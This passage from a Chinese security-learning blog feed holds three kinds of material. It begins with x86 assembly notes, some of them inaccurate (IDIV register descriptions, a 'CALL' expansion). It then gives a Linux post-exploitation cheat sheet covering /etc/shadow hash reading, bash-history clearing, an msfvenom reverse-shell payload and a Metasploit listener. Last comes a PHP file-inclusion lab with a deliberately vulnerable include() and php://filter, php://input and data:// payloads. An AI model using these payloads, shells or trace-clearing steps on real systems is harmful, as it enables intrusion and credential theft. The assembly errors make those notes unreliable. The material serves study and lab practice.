OPRD</p><p>功能：实现两个无符号二进制数除法运算</p><p>div指令是除法指令。100001/100，100001是被除数，100是除数。一般格式为：div reg或div 内存单元，reg和内存单元存放的是除数，除数可分为8位和16为2种。</p><p>被除数：默认放在AX或DX和AX，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数 为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。</p><p>————————————————————————————————</p><p>带符号数除法指令IDIV</p><p>格式：IDIV OPRD</p><p>功能：实现两个带符号数的二进制除法运算</p><p>比如16bit 的被除数，分别存在2个8bit寄存器AH：AL，商放在AL,余数在AH</p><p>比如32bit 的被除数，分别存在16个8bit寄存器DX：AX，商放在AX,余数在DX</p><p>比如64bit 的被除数，分别存在32个8bit寄存器EDX：EAX，商放在RAX,余数在EDX</p><p>比如128bit 的被除数，分别存在64个8bit寄存器RDX：RAX，商放在RAX,余数在RDX</p><h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p>加1指令INC(INCrement by 1)</p><p>格式：INC OPRD</p><h4 id="自减"><a href="#自减" class="headerlink" title="自减"></a>自减</h4><p>减一指令DEC(Decrement by 1)</p><p>格式：DEC OPRD</p><h3 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h3><p>循环控制指令LOOP</p><p>格式：loop 标号</p><p>功能：相当于</p><p>dec cx<br>Jnz<br>即先对cx减1，然后判cx是否为0，不为0，转后面给出标号所指的入口，为0，顺序执行</p><h3 id="MOV指令"><a href="#MOV指令" class="headerlink" title="MOV指令"></a>MOV指令</h3><p>数据传送指令 MOV</p><p>格式：MOV OPRD1,OPRD2</p><p>功能：将一个源操作数送到目的操作数中，即OPRD1&lt;–OPRD2</p><p>说明：</p><p>OPRD1为目的操作数，可以说寄存器、存储器、累加器</p><p>OPRD2为源操作数，可以数寄存器、存储器、累加器和立即数。</p><h3 id="MOVS-move-string"><a href="#MOVS-move-string" class="headerlink" title="MOVS(move string)"></a><strong>MOVS(move string)</strong></h3><p>movs指令是汇编少有的两边都可以是memory的指令，MOVS在开发中通常极有可能是一串字符串的复制</p><p>字符串传送指令MOVS</p><p>格式：MOVS OPRD1，OPRD2</p><p>功能：OPRD1&lt;—OPRD2</p><p>说明： 其中OPRD2为源串符号地址，OPRD1为目的串符号地址</p><h3 id="LEA"><a href="#LEA" class="headerlink" title="LEA"></a>LEA</h3><p>有效地址传送指令</p><p>格式：LEA OPRD1,OPRD2</p><p>功能：将源操作数给出的有效地址传送到指定的寄存器中</p><p>OPRD1必须是寄存器</p><h3 id="XCHG"><a href="#XCHG" class="headerlink" title="XCHG"></a>XCHG</h3><p>数据交换指令</p><p>格式：XCHG OPRD1,OPRD2，其中OPRD1为目的操作数，OPRD2为源操作数</p><p>功能：将两个操作数相互交换位置，该指令把源操作数OPRD2与目的操作数OPRD1交换</p><h3 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h3><p>格式：TEST OPRD1,OPRD2</p><p>功能：其中OPRD1、OPRD2的含义同AND指令一样，也是对两个操作数进行按位的‘与‘运算</p><p>不同之处：是不讲’与‘的结果送目的操作数，即本指令对两个操作数的内容均不进行修改，仅数载逻辑与操作后，对标志位重新置位</p><h3 id="CALL指令"><a href="#CALL指令" class="headerlink" title="CALL指令"></a>CALL指令</h3><p>过程调用指令</p><p>格式：CALL OPRD</p><p>功能：过程调用指令</p><p>相当于：</p><p>push eip</p><p>amp OPRD</p><h3 id="RETN指令"><a href="#RETN指令" class="headerlink" title="RETN指令"></a>RETN指令</h3><p>返回指令，相当于：</p><p>pop eip</p><p>jmp eip</p><h1 id="常用的JCC指令"><a href="#常用的JCC指令" class="headerlink" title="常用的JCC指令"></a>常用的JCC指令</h1><p>JMP：无条件跳转</p><p>JZ/JE：ZF = 1（jump When Zero和jump When Equal） 等于0或相等</p><p>JNZ（jump no Zero）与JNE（jump no Equals ） ZF=0 不等于0或者不相等</p><p>比较两个有符号数，高低用greater和less表示：</p><p>JG 前&gt;后 Jump if greater<br>JL 前&lt;后 Jump if less</p><p>JL=JNGE（jump if less,or not greater equal）</p><p>JGB和JLE是用于比较带符号数的转移指专令：</p><p>JGE 转移条件（Jump if greater or equal）：JGE al, bl ；al里的带符号内容大于或等于bl时跳转。</p><p>JLE 转移条件 （Jump if less or equal）：JLE al, bl ；al里的带符号内容小于或等于属bl时跳转。</p><p>比较两个无符号数，高低用below或者above表示：</p><p><strong>JBE/JNA(jump if below or equal,or not above)比较结果为&lt;=时转移</strong></p><p>JBE/JNA：CF = 1/ZF = 1 低于等于或者不高于跳转</p><p><strong>JNBE/JA（jump if not below or equal,or above）</strong></p><p>JNBE/JA：CF = 0 / ZF = 0 不低于等于/高于跳转</p><p>JL/JNGE：SF != OF 小于/不大于等于跳转</p><p>JNL/JGE：SF = OF 不小于/大于等于跳转</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjUxODE0NDgucG5n?x-oss-process=image/format,png" alt=""></p><h1 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h1><p>PUSH：压栈指令，32位汇编首先ESP-4，留出一个空间，然后把要压入栈中的内容压入</p><p>POP：出栈指令，32位汇编首先将栈顶的数据弹出给指定的目标，然后ESP+4,清掉空间</p><p>在函数栈帧中，一般包含以下几类重要信息。<br>（1）局部变量：为函数局部变量开辟的内存空间。<br>（2）栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部<br>可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。<br>（3）函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，<br>以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。</p><h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><h2 id="函数调用大致包括以下几个步骤。"><a href="#函数调用大致包括以下几个步骤。" class="headerlink" title="函数调用大致包括以下几个步骤。"></a>函数调用大致包括以下几个步骤。</h2><p>（1）参数入栈：将参数从右向左依次压入系统栈中。<br>（2）返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继 续执行。<br>（3）代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。<br>（4）栈帧调整：具体包括。<br>保存当前栈帧状态值，已备后面恢复本栈帧时使用（EBP 入栈）；<br>将当前栈帧切换到新栈帧（将 ESP 值装入 EBP，更新栈帧底部）；<br>给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）；<br>对于__stdcall 调用约定，函数调用时用到的指令序列大致如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">;func（a，b，c）</span><br><span class="line">;假设该函数有 3 个参数，将从右向左依次入栈  </span><br><span class="line"></span><br><span class="line">push 参数 c </span><br><span class="line">push 参数 b </span><br><span class="line">push 参数 a </span><br><span class="line">call 函数地址</span><br><span class="line"></span><br><span class="line">;call 指令将同时完成两项工作：</span><br><span class="line">;1）向栈中压入当前指令在内存中的位置，即保存返回地址。</span><br><span class="line">;2）跳转到所调用函数的入口地址函数入口处</span><br><span class="line"></span><br><span class="line">;下面是进入函数call之后：</span><br><span class="line">push ebp </span><br><span class="line">;保存旧栈帧的底部</span><br><span class="line">mov ebp，esp </span><br><span class="line">;设置新栈帧的底部（栈帧切换）</span><br><span class="line">sub esp，xxx </span><br><span class="line">;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）</span><br></pre></td></tr></table></figure><h2 id="函数返回的步骤如下"><a href="#函数返回的步骤如下" class="headerlink" title="函数返回的步骤如下"></a>函数返回的步骤如下</h2><p>三步：</p><p>（1）保存返回值：通常将函数的返回值保存在寄存器 EAX 中。</p><p>（2）弹出当前栈帧，恢复上一个栈帧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">具体包括： </span><br><span class="line"></span><br><span class="line">在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。 </span><br><span class="line"></span><br><span class="line">将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。 </span><br><span class="line"></span><br><span class="line">将函数返回地址弹给 EIP 寄存器。</span><br></pre></td></tr></table></figure><p>（3）跳转：按照函数返回地址跳回母函数中继续执行。</p><h2 id="理解图示："><a href="#理解图示：" class="headerlink" title="理解图示："></a>理解图示：</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNjEyMjIucG5n?x-oss-process=image/format,png" alt="image-20200527161222527"></p><h1 id="汇编练习，弹个框框"><a href="#汇编练习，弹个框框" class="headerlink" title="汇编练习，弹个框框"></a>汇编练习，弹个框框</h1><p>基础知识—-汇编代码结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.586    代表指令集</span><br><span class="line">.MODEL flat,stdcall    调用约定 内存 常用win32        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">includelib  user32.lib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data  已经定义数据段 可读可写</span><br><span class="line">.data?  未定义的数据段 可读可写</span><br><span class="line">.code 代码段</span><br><span class="line">.const  常量数据段</span><br><span class="line">.stack  堆栈段 自动分配 可读可写可执行</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">Number DWORD 0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">text db &quot;zeo&quot;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">INVOKE MessageBox,0,offset text,0,0</span><br><span class="line">INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTMyMzQwNTMucG5n?x-oss-process=image/format,png" alt="image-20200513234048034"></p><p>格式化输入输出（printf scanf）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">include msvcrt.inc</span><br><span class="line"></span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">includelib msvcrt.lib</span><br><span class="line"> </span><br><span class="line">.data</span><br><span class="line">text db &quot;zeo&quot;,0</span><br><span class="line">Hello db &quot;HelleWord!&quot;,0</span><br><span class="line">szformat db &quot;%s&quot;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">lea eax,Hello</span><br><span class="line">push eax</span><br><span class="line">push offset szformat</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line">push offset Hello</span><br><span class="line">;push offset szformat</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line">call ExitProcess</span><br><span class="line">add esp,4</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 内网本机信息收集速查</title>
      <link href="/2020/06/23/Linux%20%E5%86%85%E7%BD%91%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%80%9F%E6%9F%A5/"/>
      <url>/2020/06/23/Linux%20%E5%86%85%E7%BD%91%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%80%9F%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Linux 内网本机信息收集速查</p><h4 id="系统类型"><a href="#系统类型" class="headerlink" title="系统类型"></a>系统类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">查看系统名称</span><br></pre></td></tr></table></figure><h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname –a 查看所有信息</span><br></pre></td></tr></table></figure><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br><span class="line">cat &#x2F;etc&#x2F;passwd #查看用户列表</span><br><span class="line">cat &#x2F;etc&#x2F;shadow #获取用户hash</span><br></pre></td></tr></table></figure><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux 查看进程信息</span><br></pre></td></tr></table></figure><h4 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces #网卡信息</span><br><span class="line">ifconfig</span><br><span class="line">route #查看路由</span><br><span class="line">arp -a #查看缓存的地址解析情况</span><br></pre></td></tr></table></figure><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;serivice #查看存在的服务</span><br><span class="line">cat &#x2F;etc&#x2F;serices | grep ** #查看对应服务</span><br></pre></td></tr></table></figure><h4 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">cat &#x2F;etc&#x2F;my.conf</span><br><span class="line">cat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br></pre></td></tr></table></figure><h4 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log #http日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;error.log #mysql日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apt&#x2F;history.log #apt日志</span><br></pre></td></tr></table></figure><h4 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> ~&#x2F;.bash_history</span><br><span class="line">echo &gt; .bash_history #上述文件类日志删除</span><br><span class="line">history #命令操作历史</span><br><span class="line">history -c #删除</span><br></pre></td></tr></table></figure><h4 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l #查看安装的软件包</span><br><span class="line">rpm -qa #查看安装的软件包</span><br></pre></td></tr></table></figure><h3 id="LINUX后门生成"><a href="#LINUX后门生成" class="headerlink" title="LINUX后门生成"></a>LINUX后门生成</h3><p>1.示例指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.73.131 LPORT&#x3D;4444 -f elf &gt; root&#x2F;Desktop&#x2F;shell</span><br></pre></td></tr></table></figure><p>2.配置<code>Metasploit</code>，<code>exploit</code>监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search exploit&#x2F;hanler  &#x2F;&#x2F; (exploit&#x2F;multi&#x2F;handler：通用有效负载处理程序)</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler        &#x2F;&#x2F; 使用模块</span><br><span class="line">show options         &#x2F;&#x2F; 配置</span><br><span class="line">set LHOST 192.168.73.131</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp         &#x2F;&#x2F; 设置测试的载荷</span><br><span class="line">exploit            &#x2F;&#x2F; 监听</span><br></pre></td></tr></table></figure><p>nmap扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap ‐sP ‐PI 192.168.1.0&#x2F;24 ‐T4</span><br></pre></td></tr></table></figure><p>端口扫描</p><p>auxiliary/scanner/portscan<br>scanner/portscan/ack ACK防火墙扫描<br>scanner/portscan/ftpbounce FTP跳端口扫描<br>scanner/portscan/syn SYN端口扫描<br>scanner/portscan/tcp TCP端口扫描<br>scanner/portscan/xmas TCP”XMas”端口扫描</p><p>SMB扫描</p><p><strong>scanner下模块，辅助发现内网存活主机，分别为：</strong></p><ul><li><p>auxiliary/scanner/discovery/arp_sweep</p></li><li><p>auxiliary/scanner/discovery/udp_sweep</p></li><li><p>auxiliary/scanner/ftp/ftp_version</p></li><li><p>auxiliary/scanner/http/http_version</p></li><li><p>auxiliary/scanner/smb/smb_version</p></li><li><p>auxiliary/scanner/ssh/ssh_version</p></li><li><p>auxiliary/scanner/telnet/telnet_version</p></li><li><p>auxiliary/scanner/discovery/udp_probe</p></li><li><p>auxiliary/scanner/dns/dns_amp</p></li><li><p>auxiliary/scanner/mysql/mysql_version</p></li><li><p>auxiliary/scanner/netbios/nbname</p></li><li><p>auxiliary/scanner/http/title</p></li><li><p>auxiliary/scanner/db2/db2_version</p></li><li><p>auxiliary/scanner/portscan/ack</p></li><li><p>auxiliary/scanner/portscan/tcp</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议 配合 文件包含漏洞.md</title>
      <link href="/2020/06/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%20%E9%85%8D%E5%90%88%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md/"/>
      <url>/2020/06/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%20%E9%85%8D%E5%90%88%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h1><p>被问到了php的一伪协议</p><p>后发现自己对伪协议的认识还是太浅， 现在好好总结学习一番</p><p>又感觉自己学了半天不知道自己在干嘛。。。哎。。。</p><h1 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h1><p>PHP版本：5.4.45</p><p>PHP.ini：</p><p>allow_url_fopen ：on 默认开启</p><p>allow_url_include：om 默认关闭</p><p>PHP版本&lt;=5.2 可以使用%00进行截断，但是少有低版本的了。。。</p><p>先站在前人的大肩膀看看总结 ，主要是两个选项的开关，实验我默认都开了</p><p>freebuff上看到的</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTEyMjEyMjMucG5n?x-oss-process=image/format,png" alt="img"></p><h1 id="0x02-具体的协议"><a href="#0x02-具体的协议" class="headerlink" title="0x02 具体的协议"></a>0x02 具体的协议</h1><p>我的实验代码cmd.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#39;file&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="php-访问输入输出流"><a href="#php-访问输入输出流" class="headerlink" title="php:// 访问输入输出流"></a>php:// 访问输入输出流</h2><p>其中主要有两个协议：</p><h3 id="php-filter-简介"><a href="#php-filter-简介" class="headerlink" title="php://filter 简介"></a>php://filter 简介</h3><p>PHP 过滤器用于对来自非安全来源的数据（比如用户输入）进行验证和过滤。</p><p>在文件包含中常用到这个协议（因为文件包含的特性，只有包含php标签就会解析，就算是PHP后缀但是里面没有PHP标签也不会解析）</p><p>所以如果想要读取运行php文件的源码，可以先base64编码，再传入include函数，这样就不会被认为是php文件，不会执行，会输出文件的base64编码，再解码即可。</p><p>常用payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTEyMzQ5MjIucG5n?x-oss-process=image/format,png" alt="image-20200611234922747"></p><p>解码即可</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTEyMzQ5NDgucG5n?x-oss-process=image/format,png" alt="image-20200611234948231"></p><h3 id="php-input-协议"><a href="#php-input-协议" class="headerlink" title="php://input 协议"></a>php://input 协议</h3><p>这个协议的利用方法是 :</p><p>将要执行的语法php代码写在post中提交，只写代码即可。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTIwMDA0MjEucG5n?x-oss-process=image/format,png" alt="image-20200612000421438"></p><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h2><p>file:// 用于访问本地文件系统，</p><p>不受allow_url_fopen与allow_url_include的影响</p><p>注意需要绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;文件的绝对路径和文件名</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTEyMzU3NTgucG5n?x-oss-process=image/format,png" alt="image-20200611235758574"></p><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>data://协议需要满足双on条件</p><p><strong>PHP.ini：</strong></p><p>data://协议必须双在on才能正常使用；</p><p>allow_url_fopen ：on</p><p>allow_url_include：on</p><p>利用payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">cmd.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">cmd.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">cmd.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTIwMDAxMDkucG5n?x-oss-process=image/format,png" alt="image-20200612000109840"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTIwMDA1MjMucG5n?x-oss-process=image/format,png" alt="image-20200612000523051"></p><h2 id="zip-压缩协议"><a href="#zip-压缩协议" class="headerlink" title="zip://压缩协议"></a>zip://压缩协议</h2><p>条件：</p><p>需要绝对路径</p><p>allow_url_fopen ：off/on 任意</p><p>allow_url_include：off/on 任意</p><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件</p><p>要点：不需要指定后缀名也可以利用</p><p>我只实验了zip协议</p><p>利用的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;zip:&#x2F;&#x2F;绝对路径#压缩文件内的子文件名</span><br></pre></td></tr></table></figure><p>只能传入绝对路径。</p><p>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;xieyi.zip%23sd.php</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTIwMDE0MjIucG5n?x-oss-process=image/format,png" alt="image-20200612001422357"></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>留下了菜的泪水，发现学的有点杂，但是有些东西学的不到位吧。<br>纯自学有时候有点迷啊，学的乱七八糟的。<br>还有几个协议没写完，先把常用的写了，后续补上</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796_RCE漏洞exp复现</title>
      <link href="/2020/06/05/CVE-2020-0796_RCE%E6%BC%8F%E6%B4%9Eexp%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/06/05/CVE-2020-0796_RCE%E6%BC%8F%E6%B4%9Eexp%E5%A4%8D%E7%8E%B0/</url>
      
